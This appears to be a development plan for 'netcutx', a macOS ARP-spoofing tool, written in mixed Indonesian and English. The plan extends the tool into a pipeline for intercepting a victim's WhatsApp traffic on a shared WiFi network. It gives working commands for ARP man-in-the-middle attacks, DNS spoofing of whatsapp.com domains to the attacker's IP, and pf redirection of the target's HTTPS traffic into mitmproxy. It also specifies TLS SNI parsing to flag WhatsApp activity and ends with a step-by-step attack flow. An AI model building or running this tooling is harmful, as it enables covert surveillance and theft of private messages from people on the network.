# netcutx Feature Plan — WhatsApp Extraction Pipeline

## Overview

Extend netcutx from ARP spoof-only tool to full LAN interception suite.
Target: extract WhatsApp chat + media from target traffic in same WiFi.

Architecture: netcutx = ARP MITM foundation + modular pipeline features.

---

## Fase 0: Foundation (Sudah Ada)

- [x] ARP spoof — unicast + broadcast poison
- [x] Kirim raw frame via BPF
- [x] Baca raw frame via BPF recv
- [x] Network scanning (ARP-based)
- [x] MAC / gateway detection
- [x] Daemon mode — LaunchDaemon, survive reconnect
- [x] IPC socket — komunikasi daemon ↔ GUI
- [x] Menubar GUI — native macOS AppKit

---

## Fase 1: Passive Capture + Metadata Logging (`monitor`)

**Goal:** Record aktivitas target tanpa inject. Output JSON.

### Status: ✅ Selesai (2024-06-25)

### Spesifikasi
- Subcommand `netcutx monitor [target-ip]` : loop BPF recv, parse IP/TCP/UDP header
- Log per packet: timestamp, src/dst IP, src/dst port, protocol, size, TTL, TCP flags
- Filter by target IP (drop packets not from/to target)
- Filter out our own IP traffic (supaya ga log sendiri)
- Output JSON ke stdout (setiap line 1 JSON object)
- Status message ke stderr (biar stdout clean buat piping ke `jq`)
- TCP flags parsing: SYN, ACK, FIN, RST, PSH, URG
- Auto-detect interface + IP
- Signal handler (Ctrl+C → cleanup + exit)

### Files Modified
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/Capture.swift` | **Baru** — `parseIPPacket()`, `captureRun()`, `standaloneCapture()` |
| `Sources/netcutx/main.swift` | Tambah `case "monitor"` subcommand + update `usage()` |

### Usage
```bash
# Capture all traffic on interface
sudo netcutx monitor

# Filter to specific target
sudo netcutx monitor 192.168.1.100

# Pipe ke jq buat analisa
sudo netcutx monitor 192.168.1.100 2>/dev/null | jq '.size, .dst'

# Simpan ke file
sudo netcutx monitor 192.168.1.100 > capture.jsonl
```

### JSON Output
```json
{"ts":"2024-06-25T12:00:00.123Z","src":"192.168.1.100","dst":"31.13.66.1","sport":54321,"dport":443,"proto":"TCP","size":1200,"ttl":64,"n":1,"flags":"SYN"}
```

### Future
- Combined spoof + capture (`netcutx <victim> -b -f --capture`)
- Daemon integration — capture via IPC
- File output + rotation

---

## Fase 2: Device OS Fingerprinting

**Goal:** Extend scan — bedain Android vs iPhone vs desktop.

### Status: ✅ Selesai (2024-06-25)

### Spesifikasi
- Probe port: 5555 (ADB), 62078 (AFC), 22, 80, 443, 8443, 8080
- Kirim TCP SYN via raw BPF (dengan proper IP + TCP checksum)
- Tunggu SYN-ACK/RST via BPF recv
- Analisa TCP TTL dari reply
- Fallback ICMP TTL via `ping` command
- Classifier logic:
  - Port 5555 terbuka → Android (90%)
  - Port 62078 terbuka → iPhone (90%)
  - TTL ≥ 128 + web ports → Windows
  - TTL ≤ 64 + SSH → Linux
  - TTL = 255 → Router
- Batch mode: kirim SYN ke semua target sekaligus, kumpulkan response
- `DeviceType` enum di `ARPTypes.swift`
- `deviceType` field di `DeviceInfo` + tampil di tabel

### Files Modified
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/DeviceFingerprint.swift` | **Baru** — `buildTCPSYN()`, `classifyDevice()`, `fingerprintDevice()`, `fingerprintAllDevices()`, `standaloneFingerprint()` |
| `Sources/netcutx/ARPTypes.swift` | Tambah enum `DeviceType` |
| `Sources/netcutx/UI.swift` | `DeviceInfo.deviceType`, tabel OS column |
| `Sources/netcutx/main.swift` | Subcommand `fingerprint`, integrasi di `interactiveMode()` |
| `Sources/netcutx/Daemon.swift` | Integrasi fingerprint di `runDaemon()` |

### Usage
```bash
# Standalone fingerprint
sudo netcutx fingerprint 192.168.1.100

# Interactive mode — otomatis fingerprint setelah scan
sudo netcutx
# → scan → OS detection → table with OS column

# Daemon — fingerprint saat auto-scan
sudo netcutx install
```

### Output (standalone)
```
✓ Interface en0 — 192.168.1.12
▸ Resolving MAC for 192.168.1.100...
✓ 192.168.1.100 = a4:c3:f0:12:34:56
▸ Probing 7 ports...

  ── Fingerprint Result ──
  Device    : 192.168.1.100
  MAC       : a4:c3:f0:12:34:56
  OS        : Android (90% confidence)
  TTL       : 64
  Open ports: 443, 5555
```

### Classification Logic
| TTL | Open Ports | Result |
|-----|------------|--------|
| ≤64 | 5555 | Android |
| ≤64 | 62078 | iPhone |
| ≥128 | 80/443 + others | Windows |
| ≤64 | 22 | Linux |
| ≤64 | 2+ non-ADB/AFC | Linux |
| =255 | any | Router |
| any | few/none | Unknown |

### Dependensi: Fase 1 (BPF recv parsing + checksum)

---

## Fase 3: DNS Spoofing

**Goal:** Intercept DNS query target, redirect domain ke IP attacker.

### Status: ✅ Selesai (2024-06-25)

### Spesifikasi
- **Standalone mode**: `sudo netcutx dns-spoof <target> <domain>=<ip> [more...]`
- Parse UDP packet dari BPF recv — deteksi DNS query (port 53, QR=0)
- DNS name parser: label format → domain string
- Bangun DNS response frame:
  - Full Ethernet + IP + UDP + DNS payload
  - Spoof source IP sebagai real DNS server
  - Pointer compression (`0xC00C`) untuk answer section
  - TTL = 5 detik (low, prevent caching)
  - Transaction ID match dengan query
- Inject via BPF send ke interface
- Multiple rules: `dns-spoof target domain1=ip1 domain2=ip2`
- Domain matching: exact match atau suffix match
- **Full MITM**: ARP poison bidirectional + IP forwarding + DNS listener
- Interleaved loop: send ARP poison every 10 iterations, listen for DNS in between
- Graceful restore ARP on exit

### Files Modified
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/DNSSpoofer.swift` | **Baru** — `parseDNSQuery()`, `buildDNSResponse()`, `buildDNSResponseFrame()`, `extractDNSFrame()`, `dnsSpoofRun()`, `standaloneDNSSpoof()` |
| `Sources/netcutx/main.swift` | Subcommand `dns-spoof`, parser format `domain=ip` |
| `Sources/netcutx/Spoofer.swift` | `setIPForwarding()` private → internal (shared) |
| `Sources/netcutx/Capture.swift` | `statusErr()` private → internal (shared) |
| `Sources/netcutx/DeviceFingerprint.swift` | `computeChecksum()` private → internal (shared) |

### Usage
```bash
# Single domain
sudo netcutx dns-spoof 192.168.1.100 web.whatsapp.com=192.168.1.12

# Multiple domains
sudo netcutx dns-spoof 192.168.1.100 \
  web.whatsapp.com=192.168.1.12 \
  wa.whatsapp.com=192.168.1.12 \
  google.com=192.168.1.12
```

### DNS Response Format
```
Ethernet:  targetMAC → ourMAC | IPv4
IP:        dnsServerIP → targetIP | UDP
UDP:       53 → querySrcPort
DNS:
  Header:   ID=match, QR=1, AA=1, RA=1, RCODE=0
  Question: echo original query
  Answer:   Name=0xC00C, Type=A, Class=IN, TTL=5, RDLENGTH=4, RDATA=fakeIP
```

### Loop Architecture
```
while _stopFlag == 0:
  if counter % 10 == 0:
    send_arp_poison_packets()
  pkt = bpf.recv(timeout=50ms)
  if pkt is DNS query from target:
    parsed = parse_dns(pkt)
    for rule in rules:
      if domain matches:
        resp = build_dns_response(...)
        bpf.send(resp)
```

### Dependensi: Fase 1 (UDP parsing) + `computeChecksum()` dari Fase 2

---

## Fase 4: HTTP Redirect Automation

**Goal:** Auto-set pf + launch mitmproxy dari netcutx.

### Status: ✅ Selesai (2024-06-25)

### Spesifikasi
- **Subcommand**: `netcutx redirect start|stop|status`
- `redirect start <target>` — create pf `rdr` rule:
  - Port 443 → `127.0.0.1:8080`
  - Port 80 → `127.0.0.1:8080`
- Full pf config: rdr rules + basic pass in/out (non-destructive with restore)
- `redirect stop` — restore default macOS pfconfig (`/etc/pf.conf`)
- `redirect status` — show current pf rules
- Options: `--port <n>` (proxy port), `--interface <iface>`, `--mitmproxy` (auto-launch)
- Save current rules before overwrite (fallback)
- Require root (sudo)

### Files Modified
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/HTTPRedirect.swift` | **Baru** — `pfctlRun()`, `redirectStart()`, `redirectStop()`, `redirectStatus()` |
| `Sources/netcutx/main.swift` | Subcommand `redirect` dengan sub-parser `start|stop|status` |

### Usage
```bash
# Setup redirect target → local proxy
sudo netcutx redirect start 192.168.1.100

# Custom port + auto-launch mitmproxy
sudo netcutx redirect start 192.168.1.100 --port 9090 --mitmproxy

# Cleanup
sudo netcutx redirect stop

# Check active rules
sudo netcutx redirect status
```

### pf Config
```
rdr pass on en0 inet proto tcp from 192.168.1.100 to any port 443 -> 127.0.0.1 port 8080
rdr pass on en0 inet proto tcp from 192.168.1.100 to any port 80 -> 127.0.0.1 port 8080
pass out all
pass in all keep state
```

### Dependensi: None

---

## Fase 5: WhatsApp Traffic Detector

**Goal:** Deteksi + log aktivitas WA dari traffic target.

### Status: ✅ Selesai (2024-06-25)

### Spesifikasi
- Filter IP: match `31.13.0.0/16` + subnets (`31.13.24.0/21`, `31.13.64.0/18`, `31.13.68.0/24`, `31.13.70.0/23`, `31.13.72.0/22`)
- Parse TLS SNI dari ClientHello — byte-level parser dari TCP payload:
  - Skip Ethernet (14) + IP header (variable) + TCP header (variable)
  - Parse TLS Record: type=0x16 (Handshake), version, length
  - Parse Handshake: type=0x01 (ClientHello), length
  - Parse Extensions: find type=0x0000 (SNI), extract host_name
- Klasifikasi domain:
  - `web.whatsapp.com` → WEB (WhatsApp Web)
  - `wa.whatsapp.com`, `pps.whatsapp.net` → CHAT (mobile API)
  - `mmg.whatsapp.net`, `mmg-1.whatsapp.com` → MEDIA (upload/download)
  - `static.whatsapp.net` → STATIC
- Fallback: WA IP tanpa SNI → MEDIA jika ukuran > 100KB
- Output: `[WA] <target> → <domain> (<ip>) <TYPE> <size>`

### Files Modified
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/WADetector.swift` | **Baru** — `WAEvent`, `WAType`, `checkWA()`, `parseSNI()`, `classifyWADomain()`, `isWAIP()` |
| `Sources/netcutx/Capture.swift` | `captureRun()` + `standaloneCapture()` — parameter `detectWA`, integrasi `checkWA()` di loop |
| `Sources/netcutx/main.swift` | `monitor` subcommand — parse `--detect-wa` / `--wa` flag |

### Usage
```bash
# Capture + WA detection
sudo netcutx monitor 192.168.1.100 --detect-wa

# JSON ke stdout, WA alerts ke stderr
sudo netcutx monitor 192.168.1.100 --detect-wa 2>&1 | grep '\[WA\]'

# WA alerts only
sudo netcutx monitor 192.168.1.100 --detect-wa 2>/dev/null | jq '.'
```

### SNI Parser Detail
```
Packet → Ethernet[14] → IP[variable] → TCP[variable] → TLS Record
  TLS Record: type(1) + version(2) + length(2) → Handshake
    Handshake: type(1) + length(3) → ClientHello
      ClientHello: skip version(2) + random(32) + session_id + cipher_suites + compression
        Extensions: type(2) + length(2) → search for 0x0000 (SNI)
          SNI: list_length(2) + name_type(1) + name_length(2) + name(variable)
```

### Dependensi: Fase 1 (capture loop + BPF recv)

---

## Fase 6: Activity Log Export

**Goal:** Output structured JSON/CSV buat analisa lanjutan.

### Spesifikasi
- Format output JSON: array of sessions
- Format output CSV: `timestamp,src_ip,dst_ip,src_port,dst_port,proto,size,sni,wa_type`
- Integrasi dengan daemon — simpan ke `/var/log/netcutx_capture.log`
- Subcommand: `netcutx log <target> --format json`
- Subcommand: `netcutx log <target> --format csv`
- Subcommand: `netcutx log --realtime` (stream ke stdout)
- Log rotation: max 100MB, rotate ke `.1`, `.2`
- Filter by waktu: `--since`, `--until`

### Files to Modify
| File | Perubahan |
|------|-----------|
| `Sources/netcutx/ActivityLogger.swift` | Baru — log format, rotasi, query |
| `Sources/netcutx/DaemonIPC.swift` | Tambah cmd `getlog` + stream |
| `Sources/netcutx/main.swift` | Tambah subcommand `log` |
| `Sources/NetcutxUI/AppDelegate.swift` | Tambah menu export log |

### Effort: 1-2 hr
### Dependensi: Fase 1 (data source)

---

## Development Rules

### Build & Verify
```bash
# Build CLI daemon
make

# Build GUI
make ui

# Build app bundle
make app

# Run lint (Swift syntax check)
swiftc -typecheck Sources/netcutx/*.swift Sources/NetcutxBPF/NetcutxBPF.swift sources/NetcutxBPF_C/netcutx_bpf.c
```

### Code Style
- No comments in code unless explaining WHY (not what)
- Match existing patterns: `FunctioName()` camelCase, `struct Config` PascalCase
- Thread safety: use `NSLock` + atomic flags (like existing `_stopFlag`)
- BPF operations: wrap in `do/catch`, error → `daemonLog()` atau `fail()`
- IPC commands: JSON, add to `DaemonIPC.swift` switch-case
- CLI flags: match existing style (`--kebab-case`)

### Testing Priority
- Each feature must run without crash on basic scenario
- Test with netcutx self-test: `sudo netcutx --self-test`
- Validate ARP restore after crash/exit

### Pipeline Priority Order

```
Fase 1 ──> Fase 2 ──> Fase 3 ──> Fase 5
Fase 4 (parallel, independent)
Fase 6 (after Fase 1)
```

### Execution Flow — WhatsApp Extraction via netcutx

```
# 1: Posisi MITM + Capture + WA detect
sudo netcutx -i en0 -g 192.168.1.1 192.168.1.100 -b -f --monitor --detect-wa

# 2: Aktivitas WA muncul di log
# [WA] 192.168.1.100 > mmg.whatsapp.net media upload 2.1MB 14:32:01
# [WA] 192.168.1.100 > web.whatsapp.com TLS SNI detected 14:35:22

# 3: Jika target buka WA Web → redirect proxy + DNS spoof
sudo netcutx redirect start --mitmproxy --target 192.168.1.100
sudo netcutx -i en0 -g 192.168.1.1 192.168.1.100 --dns-spoof web.whatsapp.com 192.168.1.12

# 4: Export log
sudo netcutx log 192.168.1.100 --format json --since 1h > wa_activity.json
```
